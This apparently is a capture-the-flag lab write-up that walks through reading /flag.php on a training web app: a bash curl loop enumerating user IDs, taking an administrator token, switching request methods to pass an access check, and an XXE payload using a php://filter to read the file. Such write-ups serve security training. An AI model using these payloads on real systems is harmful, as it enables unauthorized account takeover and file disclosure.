### Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'

**HTTP Tampering**
![](Screenshot%202026-07-24%20at%2016.08.16.png)
![](Screenshot%202026-07-24%20at%2016.08.38.png)

We need to FUZZ  `uid`  of users from 1 to 100

```bash
#!/bin/bash

for uid in {1..100}; do
	curl -s "http://IP:PORT/api.php/user/$uid"; echo
done
```

I saw the `administrator` with the `uid` 52
![](Screenshot%202026-07-24%20at%2016.11.41.png)


![](Screenshot%202026-07-24%20at%2016.13.09.png)

This is a token from `administrator` 
![](Screenshot%202026-07-24%20at%2016.13.58.png)

Now i've changed the request body 
![](Screenshot%202026-07-24%20at%2016.16.25.png)

But i got access denied
![](Screenshot%202026-07-24%20at%2016.19.15.png)

Changed from `POST` to `GET` let see
![](Screenshot%202026-07-24%20at%2016.22.53.png)
![](Screenshot%202026-07-24%20at%2016.23.09.png)

Let's login by admin account
![](Screenshot%202026-07-24%20at%2016.23.41.png)
![](Screenshot%202026-07-24%20at%2016.24.05.png)
![](Screenshot%202026-07-24%20at%2016.25.41.png)

This is a xml payload that can read `flag.php` via the PHP filter `convert.base64-encode`

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
    <name>&xxe;</name>
    <details>test</details>
    <date>2021-09-22</date>
</root>
```
![](Screenshot%202026-07-24%20at%2016.27.26.png)

I'll decode this and get flag
![](Screenshot%202026-07-24%20at%2016.27.57.png)
